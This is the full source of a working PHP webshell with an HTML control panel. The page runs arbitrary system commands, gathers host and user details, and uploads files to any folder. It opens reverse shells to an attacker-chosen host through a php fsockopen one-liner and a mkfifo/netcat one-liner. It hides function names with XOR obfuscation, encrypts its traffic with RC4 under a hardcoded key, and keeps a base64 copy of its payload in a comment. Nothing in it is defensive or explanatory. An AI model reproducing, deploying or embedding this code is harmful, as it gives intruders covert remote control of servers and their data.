<?php 
$_ = "{";
// base64_decode
$_BDEC_ = ($_ ^ chr('57')).($_ ^ chr('58')).($_ ^ chr('40')).($_ ^ chr('62')).($_ ^ chr('77')).($_ ^ chr('79')).($_ ^ chr('36')).($_ ^ chr('63')).($_ ^ chr('62')).($_ ^ chr('56')).($_ ^ chr('52')).($_ ^ chr('63')).($_ ^ chr('62'));
$_KEE_ = $_BDEC_("Y25zM2NfcDRzd2Q=");

// create_function
 $_CF_ = ($_ ^ chr('24')).($_ ^ chr('9')).($_ ^ chr('30')).($_ ^ chr('26')).($_ ^ chr('15')).($_ ^ chr('30')).($_ ^ chr('36')).($_ ^ chr('29')).($_ ^ chr('14')).($_ ^ chr('21')).($_ ^ chr('24')).($_ ^ chr('15')).($_ ^ chr('18')).($_ ^ chr('20')).($_ ^ chr('21'));

// Algorithm RC4
function rc4($key, $str) {
	$s = array();
	for ($i = 0; $i < 256; $i++) {
		$s[$i] = $i;
	}
	$j = 0;
	for ($i = 0; $i < 256; $i++) {
		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;
	$j = 0;
	$res = '';
	for ($y = 0; $y < strlen($str); $y++) {
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $res;
}

function encrypt($text){
	global $_KEE_;
	return base64_encode(rc4($_KEE_, $text));
}

function decrypt($cipher){
	global $_KEE_;
	return rc4($_KEE_, base64_decode($cipher));
}

// Bootstrap
if (isset($_POST['boots'])){
	die(encrypt(json_encode([
		'webroot' 		=> getcwd() . DIRECTORY_SEPARATOR,
		'hostname' 		=> shell_exec("hostname"),
		'ip_internal' 	=> "",
		"ip_extenal" 	=> "",
		"flatform" 		=> shell_exec("uname -s") == null ? "Windows\n" : "Linux\n",
		"user" 			=> shell_exec("whoami"),
	])));
}

// Execute command
if (isset($_POST['password']) && !empty($_POST['password'])){
    $cmd = decrypt($_POST['password']);
    $output = shell_exec($cmd);
    die(encrypt($output));
}

// Upload file not encryption
if (isset($_POST['f']) && !empty($_POST['f']) &&
    isset($_FILES['data_upload']) && $_FILES['data_upload']['size'] > 0){

    // Decode input
    $filename    =   $_FILES['data_upload']['name'];
    $folder      =   decrypt($_POST['f']);
    if(substr($folder, -1) == '/' || substr($folder, -1) == '\\') {
	    $folder = substr($folder, 0, -1);
	}

    // Condition
    if (file_exists($folder . $filename)){
        die(encrypt("File exists."));
    }

    // Handler
    if (move_uploaded_file($_FILES['data_upload']['tmp_name'], $folder . DIRECTORY_SEPARATOR . $filename)){
    	die(encrypt("Upload successful"));
    }else{
    	die(encrypt("Upload fail"));
    }
}

// Reverse shell using bash
if (isset($_POST['host']) 	&& !empty($_POST['host']) 	&&
    isset($_POST['port']) 	&& !empty($_POST['port']) 	&&
    isset($_POST['re_bash'])) {

    // Decode input
    $host = decrypt($_POST['host']);
    $port = decrypt($_POST['port']);

    // Handle
    $re = "php -r '\$sock=fsockopen(\"". $host ."\",". $port .");exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
    system($re);
    die(encrypt("Tunnel disconnected"));
}

// Reverse shell using netcat
if (isset($_POST['host']) 	&& !empty($_POST['host']) 	&&
    isset($_POST['port']) 	&& !empty($_POST['port']) 	&&
    isset($_POST['re_netcat'])) {

    // Decode input
    $host = decrypt($_POST['host']);
    $port = decrypt($_POST['port']);

    // Handle
    $reverse_str = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$host} {$port} >/tmp/f";
    shell_exec($reverse_str);
    die(encrypt("Tunnel disconnected"));
}

// $_CODE_ = "Ly8gQm9vdHN0cmFwCmlmIChpc3NldCgkX1BPU1RbJ2Jvb3RzJ10pKXsKCWRpZShlbmNyeXB0KGpzb25fZW5jb2RlKFsKCQknd2Vicm9vdCcgPT4gZ2V0Y3dkKCkgLiBESVJFQ1RPUllfU0VQQVJBVE9SLAoJXSkpKTsKfQoKLy8gRXhlY3V0ZSBjb21tYW5kCmlmIChpc3NldCgkX1BPU1RbJ3Bhc3N3b3JkJ10pICYmICFlbXB0eSgkX1BPU1RbJ3Bhc3N3b3JkJ10pKXsKICAgICRjbWQgPSBkZWNyeXB0KCRfUE9TVFsncGFzc3dvcmQnXSk7CiAgICAkb3V0cHV0ID0gc2hlbGxfZXhlYygkY21kKTsKICAgIGRpZShlbmNyeXB0KCRvdXRwdXQpKTsKfQoKLy8gVXBsb2FkIGZpbGUgbm90IGVuY3J5cHRpb24KaWYgKGlzc2V0KCRfUE9TVFsnZiddKSAmJiAhZW1wdHkoJF9QT1NUWydmJ10pICYmCiAgICBpc3NldCgkX0ZJTEVTWydkYXRhX3VwbG9hZCddKSAmJiAkX0ZJTEVTWydkYXRhX3VwbG9hZCddWydzaXplJ10gPiAwKXsKCiAgICAvLyBEZWNvZGUgaW5wdXQKICAgICRmaWxlbmFtZSAgICA9ICAgJF9GSUxFU1snZGF0YV91cGxvYWQnXVsnbmFtZSddOwogICAgJGZvbGRlciAgICAgID0gICBkZWNyeXB0KCRfUE9TVFsnZiddKTsKICAgIGlmKHN1YnN0cigkZm9sZGVyLCAtMSkgPT0gJy8nIHx8IHN1YnN0cigkZm9sZGVyLCAtMSkgPT0gJ1xcJykgewoJICAgICRmb2xkZXIgPSBzdWJzdHIoJGZvbGRlciwgMCwgLTEpOwoJfQoKICAgIC8vIENvbmRpdGlvbgogICAgaWYgKGZpbGVfZXhpc3RzKCRmb2xkZXIgLiAkZmlsZW5hbWUpKXsKICAgICAgICBkaWUoZW5jcnlwdCgiRmlsZSBleGlzdHMuIikpOwogICAgfQoKICAgIC8vIEhhbmRsZXIKICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZGF0YV91cGxvYWQnXVsndG1wX25hbWUnXSwgJGZvbGRlciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkZmlsZW5hbWUpKXsKICAgIAlkaWUoZW5jcnlwdCgiVXBsb2FkIHN1Y2Nlc3NmdWwiKSk7CiAgICB9ZWxzZXsKICAgIAlkaWUoZW5jcnlwdCgiVXBsb2FkIGZhaWwiKSk7CiAgICB9Cn0KCi8vIFJldmVyc2Ugc2hlbGwgdXNpbmcgYmFzaAppZiAoaXNzZXQoJF9QT1NUWydob3N0J10pIAkmJiAhZW1wdHkoJF9QT1NUWydob3N0J10pIAkmJgogICAgaXNzZXQoJF9QT1NUWydwb3J0J10pIAkmJiAhZW1wdHkoJF9QT1NUWydwb3J0J10pIAkmJgogICAgaXNzZXQoJF9QT1NUWydyZV9iYXNoJ10pKSB7CgogICAgLy8gRGVjb2RlIGlucHV0CiAgICAkaG9zdCA9IGRlY3J5cHQoJF9QT1NUWydob3N0J10pOwogICAgJHBvcnQgPSBkZWNyeXB0KCRfUE9TVFsncG9ydCddKTsKCiAgICAvLyBIYW5kbGUKICAgICRyZSA9ICJwaHAgLXIgJ1wkc29jaz1mc29ja29wZW4oXCIiLiAkaG9zdCAuIlwiLCIuICRwb3J0IC4iKTtleGVjKFwiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjNcIik7JyI7CiAgICBzeXN0ZW0oJHJlKTsKICAgIGRpZShlbmNyeXB0KCJUdW5uZWwgZGlzY29ubmVjdGVkIikpOwp9CgovLyBSZXZlcnNlIHNoZWxsIHVzaW5nIG5ldGNhdAppZiAoaXNzZXQoJF9QT1NUWydob3N0J10pIAkmJiAhZW1wdHkoJF9QT1NUWydob3N0J10pIAkmJgogICAgaXNzZXQoJF9QT1NUWydwb3J0J10pIAkmJiAhZW1wdHkoJF9QT1NUWydwb3J0J10pIAkmJgogICAgaXNzZXQoJF9QT1NUWydyZV9uZXRjYXQnXSkpIHsKCiAgICAvLyBEZWNvZGUgaW5wdXQKICAgICRob3N0ID0gZGVjcnlwdCgkX1BPU1RbJ2hvc3QnXSk7CiAgICAkcG9ydCA9IGRlY3J5cHQoJF9QT1NUWydwb3J0J10pOwoKICAgIC8vIEhhbmRsZQogICAgJHJldmVyc2Vfc3RyID0gInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIHskaG9zdH0geyRwb3J0fSA+L3RtcC9mIjsKICAgIHNoZWxsX2V4ZWMoJHJldmVyc2Vfc3RyKTsKICAgIGRpZShlbmNyeXB0KCJUdW5uZWwgZGlzY29ubmVjdGVkIikpOwp9";

//  $_X_ = $_CF_(null, $_BDEC_($_CODE_));
//  $_X_();
 ?>


<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Webshell</title>
	<link rel="stylesheet" href="">
	<!-- javascript -->
	<script src="jquery.min.js"></script>
	<script>
		$(document).ready(function(){
			$.ajax({
				type: 'post',
				url: window.location.href,
				data:{
					'boots': true
				},
				success: function(data){
					var data = JSON.parse(decrypt(data));
					$('#folder').val(data.webroot);
					$('#info').val(
						"\n[Flatform] " 		+ data.flatform
						+ "\n[Hostname] " 		+ data.hostname
						+ "\n[User] "	 		+ data.user
						+ "\n[Ip public] " 		+ data.ip_internal
						+ "\n[Ip private] " 	+ data.ip_extenal
						+ "\n[Pwd] " 			+ data.webroot
					);
				}
			});
		});
	</script>
	<!-- css -->
	<style type="text/css" media="screen">
		body{
			background-color:#080808;
			font-family: Consolas,monospace,serif;
			color: #53a9f1;
			font-size: 15px;
		}

		#cmd{
			background: url(search-dark.png) no-repeat 10px 6px #444;
		    width: 300px;
		    margin-left: 35%;
		    margin-bottom: 2%;
		    font: 12px Consolas,Helvetica,Sans-serif;
		    padding: 6px 15px 6px 35px;
		    -webkit-border-radius: 20px;
		    -moz-border-radius: 20px;
		    border-radius: 20px;
		}

		#password{
			background: url(search-dark.png) no-repeat 10px 6px #444;
		    width: 100px;
		    margin-left: 20%;
		    margin-bottom: 2%;
		    font: 12px Consolas,Helvetica,Sans-serif;
		    padding: 6px 15px 6px 35px;
		    -webkit-border-radius: 20px;
		    -moz-border-radius: 20px;
		    border-radius: 20px;
		}

		#output{
			background: 10px 6px #444;
			margin: 0px; 
			width: 75%; 
			height: 500px;
		    font: 14px Consolas,Helvetica,Sans-serif;
		    -webkit-border-radius: 10px;
		    -moz-border-radius: 10px;
		    border-radius: 10px;
		}

		#info{
			background: 10px 6px #444;
			margin: 0px; 
			width: 23%; 
			height: 500px;
		    font: 14px Consolas,Helvetica,Sans-serif;
		    -webkit-border-radius: 10px;
		    -moz-border-radius: 10px;
		    border-radius: 10px;
		}

		.textform{
		    border: 0 none;
		    color: #03FC15;
		    text-shadow: 0 2px 2px rgba(0, 0, 0, 0.3);
		    -webkit-box-shadow: 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 3px rgba(0, 0, 0, 0.2) inset;
		    -moz-box-shadow: 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 3px rgba(0, 0, 0, 0.2) inset;
		    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 3px rgba(0, 0, 0, 0.2) inset;
		    -webkit-transition: all 0.7s ease 0s;
		    -moz-transition: all 0.7s ease 0s;
		    -o-transition: all 0.7s ease 0s;
		    transition: all 0.7s ease 0s;
		}

		#cmd autofocus{
			width: 200px;
		}
	</style>
</head>
<body>
	<!-- input form -->
	<input type="text" id="cmd" class="textform" placeholder="Command line ..." autofocus>
	<input type="submit" id="sendCommand" value="Execute">
	<input type="password" id="password" class="textform" value="cns3c_p4swd" placeholder="password for encrypt"><br>
	<!-- output -->
	<textarea id="output" class="textform" id="" cols="30" rows="10"></textarea>
	<textarea id="info" class="textform" id="" cols="30" rows="10"></textarea>
	<!-- upload -->
	<form id='uploadform' method="post" enctype="multipart/form-data">
	    <input type="text" name="f" id="folder" placeholder="Destination folder">
	    <input type="file" name="data_upload", id="data_upload">
	    <input type="submit" value="Upload" name="submit">
	</form>
	<!-- backconnect -->
	<input type="text" id="host" placeholder="http://" value="http://localhost">
	<input type="text" id="port" placeholder="8000" value="8000">
	<input type="submit" id="bash" value="Bash">
	<input type="submit" id="nc" value="nc">

	<script>
		// event press enter key
		$("#cmd").keydown(function(e){
			if (e.keyCode == 13){
				$("#sendCommand")[0].click();
			}
		})
		// action send command
		$("#sendCommand").click(function(){
			cmd = encrypt($('#cmd')[0].value);

			$.ajax({
				type: 'post',
				url: window.location.href,
				data: {
					'password': cmd,
				},
				success: function(data){
					$('#output').html($('#output').html() + decrypt(data));
				}
			});
		});
		// action upload
		$('#uploadform').submit(function(e){
			e.preventDefault();
			folder = this.f.value;
			dir = encrypt( folder );
			$('#folder').val(dir);

			var params = $(this).serializeArray();
			var files = $('#data_upload')[0].files;
			var formdata = new FormData();

			formdata.append("data_upload", files[0]);
			formdata.append("f", params[0].value);
			
			$.ajax({
				type: 'post',
				url: window.location.href,
				data: formdata,
        		contentType: false,
        		processData: false,
				success: function(data){
					$('#folder').val(folder);
					alert(decrypt(data));
				},
				error: function(error){
					console.log(error);
				}
			});
		})
		// action backconnect via bash
		$('#bash').click(function(e){
			host = $('#host')[0].value;
			if(host.split("://").length == 2){
				host = host.split("://")[1];
			}
			port = $('#port')[0].value;

			$.ajax({
				type: 'post',
				url: window.location.href,
				data: {
					're_bash'	: true,
					'host'		: encrypt(host),
					'port'		: encrypt(port)
				},
				success: function(data){
					console.log(decrypt(data));
				},
				error: function(error){

				}
			})
		})
		// action backconnect via netcat
		$('#nc').click(function(e){
			host = $('#host')[0].value;
			if(host.split("://").length == 2){
				host = host.split("://")[1];
			}
			port = $('#port')[0].value;
			$.ajax({
				type: 'post',
				url: window.location.href,
				data: {
					're_netcat'	: true,
					'host'		: encrypt(host),
					'port'		: encrypt(port)
				},
				success: function(data){
					console.log(decrypt(data));
				},
				error: function(error){

				}
			})
		})
		// Algorithm RC4 
		function rc4(key, str) {
			var s = [], j = 0, x, res = '';
			for (var i = 0; i < 256; i++) {
				s[i] = i;
			}
			for (i = 0; i < 256; i++) {
				j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
				x = s[i];
				s[i] = s[j];
				s[j] = x;
			}
			i = 0;
			j = 0;
			for (var y = 0; y < str.length; y++) {
				i = (i + 1) % 256;
				j = (j + s[i]) % 256;
				x = s[i];
				s[i] = s[j];
				s[j] = x;
				res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
			}
			return res;		}

		function encrypt(text){
			key = $('#password')[0].value;
			return btoa(rc4(key, text));
		}

		function decrypt(text){
			key = $('#password')[0].value;
			return rc4(key, atob(text));
		}
	</script>
	
</body>
</html>

